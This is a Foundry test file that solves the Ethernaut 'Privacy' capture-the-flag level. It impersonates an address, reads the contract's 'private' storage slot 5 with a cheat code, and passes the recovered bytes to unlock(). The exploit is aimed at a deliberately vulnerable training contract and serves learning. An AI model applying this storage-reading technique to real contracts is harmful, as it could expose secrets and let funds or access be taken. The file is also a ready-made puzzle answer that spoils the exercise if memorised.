pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Privacy/Privacy.sol";
import "../Privacy/PrivacyFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
  // Loads a storage slot from an address
  function load(address account, bytes32 slot) external returns (bytes32);
}

contract PrivacyTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    PrivacyFactory privacyFactory;
    address levelAddress;
    bool levelSuccessfullyPassed;

    function setUp() public {
        // Setup instances of the Ethernaut & PrivacyFactory contracts
        ethernaut = new Ethernaut();
        privacyFactory = new PrivacyFactory();
    }

    function testPrivacyHack() public {

        // Register the Ethernaut Privacy level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(privacyFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(1 ether);
        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(address(0));

        // Set up the Level
        levelAddress = ethernaut.createLevelInstance(privacyFactory);

        // Cast the level address to the Privacy contract class
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        // Cheat code to load contract storage at specific slot
        bytes32 secretData = cheats.load(levelAddress, bytes32(uint256(5)));
        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(secretData)); 

        // Not relevant to completing the level but show how we can split a bytes32 into its component parts
        bytes16[2] memory secretDataSplit = [bytes16(0), 0];
        assembly {
            mstore(secretDataSplit, secretData)
            mstore(add(secretDataSplit, 16), secretData)
        }

        // Call the unlock function with the secretData we read from storage, also cast bytes32 to bytes16
        ethernautPrivacy.unlock(bytes16(secretData));

        // Submit level to the core Ethernaut contract
        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));

        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelSuccessfullyPassed);
    }
}